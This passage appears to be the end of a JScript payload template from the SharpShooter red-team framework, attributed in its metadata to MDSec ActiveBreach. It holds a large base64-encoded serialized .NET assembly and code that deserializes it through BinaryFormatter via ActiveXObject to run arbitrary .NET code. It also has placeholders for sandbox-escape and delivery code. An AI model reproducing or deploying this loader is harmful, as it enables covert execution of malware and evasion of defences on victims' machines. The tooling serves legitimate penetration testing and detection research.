"PQBUAFgAVAAgAC0AcgBlAHQAcgB5AD0AMwAgAC0AdABpAG0AZQBvAHUAdAA9ADYAIAB7ADAAfQAB"+
"AyIAAAUwAC4AAAM7AAADLgAAH0MAbwBtAHAAaQBsAGUAcgBWAGUAcgBzAGkAbwBuAAAJdgAzAC4A"+
"NQAAKy8AdQBuAHMAYQBmAGUAIAAvAHAAbABhAHQAZgBvAHIAbQA6AHgAOAA2AAAJVABlAG0AcAAA"+
"IUUAcgByAG8AcgAgACgAewAwAH0AKQA6ACAAewAxAH0AAH+BnU7r9IRDl0fyWingeIcABCABAQgD"+
"IAABBSABARERBCABAQ4EIAEBAgQAABJ9AyAADggAAwIODhGAhQsHBBUSQQEOHQ4IDgUVEkEBDgQA"+
"AQIOBSABARMAAyAACBMHCBUSQQEOHQ4dEkUIEkUdDggOBQAAHRJFBSAAEoCNBCABAg4GAAMODg4O"+
"BSABDh0DAwAAAgQHARIIBAABAQgGBwISDB0OBCAAHQMJIAIdDh0DEYChBAcBHQUFIAASgKkFIAIB"+
"Dg4EIAEODgUAAR0FDgoHBg4ODg4STRJRBQACDg4cBiABARGAuQcAARJREoC1BSAAEoC9CQADEk0O"+
"DhGAxQMgAAIFIAASgM0GIAESgMkIAgYOBSACDg4OCAcFDggOHQUIBQACDg4OBSACCA4IBSACDggI"+
"BAABCA4GAAMOHBwcBQcCHQUIByADAR0FCAgHIAMIHQUICAkHBBJZElkSXQ4FIAEBHQUIIAIBElUR"+
"gN0FAAASgOEEIAAdBQUgAQ4dBRYHDBJhEmUODhJpHQ4IDhJtEnESdRJ5BxUSgOUCDg4HIAIBEwAT"+
"AQogAQEVEoDpAg4OBSAAEoDtBCABCA4GAAEOEYDxBSACAQ4CBiABARKA+QggAhJpEmUdDgUgABKB"+
"AQQgABJxAyAAHAYAAw4OHBwFIAESbQ4FIAASgQ0GIAESgREOBiABEoEVDgYgAhwcHRwIt3pcVhk0"+
"4IkFIAIBCA4IIAUBDg4OCA4HIAIBElUSVQkgBQEdDg4OAg4IAQAIAAAAAAAeAQABAFQCFldyYXBO"+
"b25FeGNlcHRpb25UaHJvd3MBCAEAAgAAAAAAGQEAFFNoYXJwU2hvb3RlckFzc2VtYmx5AAAiAQAd"+
"U2hhcnBTaG9vdGVyIFBheWxvYWQgRGVsaXZlcnkAAAUBAAAAABcBABJNRFNlYyBBY3RpdmVCcmVh"+
"Y2gAACcBACJDb3B5cmlnaHQgwqkgTURTZWMgQ29uc3VsdGluZyAyMDE3AAApAQAkNTY1OThmMWMt"+
"NmQ4OC00OTk0LWEzOTItYWYzMzdhYmU1Nzc3AAAMAQAHMS4wLjAuMAAABQEAAQAAAAAAAE9knFoA"+
"AAAAAgAAABwBAACcRwAAnCkAAFJTRFO9wyaU5owDRZKyvj63i7VmAQAAAFo6XGRtY1xDb2RlXFNo"+
"YXJwU2hvb3RlclxTaGFycFNob290ZXJcQ1NoYXJwU2hvb3RlclxvYmpcUmVsZWFzZVxTaGFycFNo"+
"b290ZXJBc3NlbWJseS5wZGIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAA4EgAAAAAAAAAAAAA+kgAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AOxIAAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAMAAAgAAAAAAA"+
"AAAAAAAAAAAAAQAAAAAASAAAAFhgAAD4AwAAAAAAAAAAAAD4AzQAAABWAFMAXwBWAEUAUgBTAEkA"+
"TwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAgAA"+
"AAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEA"+
"bgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEWAMAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBv"+
"AAAANAMAAAEAMAAwADAAMAAwADQAYgAwAAAAVAAeAAEAQwBvAG0AbQBlAG4AdABzAAAAUwBoAGEA"+
"cgBwAFMAaABvAG8AdABlAHIAIABQAGEAeQBsAG8AYQBkACAARABlAGwAaQB2AGUAcgB5AAAARgAT"+
"AAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAABNAEQAUwBlAGMAIABBAGMAdABpAHYAZQBCAHIA"+
"ZQBhAGMAaAAAAAAAUgAVAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAFMAaABh"+
"AHIAcABTAGgAbwBvAHQAZQByAEEAcwBzAGUAbQBiAGwAeQAAAAAAMAAIAAEARgBpAGwAZQBWAGUA"+
"cgBzAGkAbwBuAAAAAAAxAC4AMAAuADAALgAwAAAAUgAZAAEASQBuAHQAZQByAG4AYQBsAE4AYQBt"+
"AGUAAABTAGgAYQByAHAAUwBoAG8AbwB0AGUAcgBBAHMAcwBlAG0AYgBsAHkALgBkAGwAbAAAAAAA"+
"aAAiAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACp"+
"ACAATQBEAFMAZQBjACAAQwBvAG4AcwB1AGwAdABpAG4AZwAgADIAMAAxADcAAAAqAAEAAQBMAGUA"+
"ZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAFoAGQABAE8AcgBpAGcAaQBuAGEAbABG"+
"AGkAbABlAG4AYQBtAGUAAABTAGgAYQByAHAAUwBoAG8AbwB0AGUAcgBBAHMAcwBlAG0AYgBsAHkA"+
"LgBkAGwAbAAAAAAASgAVAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABTAGgAYQByAHAAUwBo"+
"AG8AbwB0AGUAcgBBAHMAcwBlAG0AYgBsAHkAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIA"+
"cwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBz"+
"AGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AABAAAAMAAAADDkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AQ0AAAAEAAAACRcAAAAJBgAAAAkWAAAABhoAAAAnU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkg"+
"TG9hZChCeXRlW10pCAAAAAoL";
var entry_class = 'SharpShooter';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var d = fmt.Deserialize_2(stm);
	var o = d.DynamicInvoke(undefined).CreateInstance(entry_class);

%SANDBOX_ESCAPES%
%DELIVERY%

} catch (e) {
    debug(e.message);
}
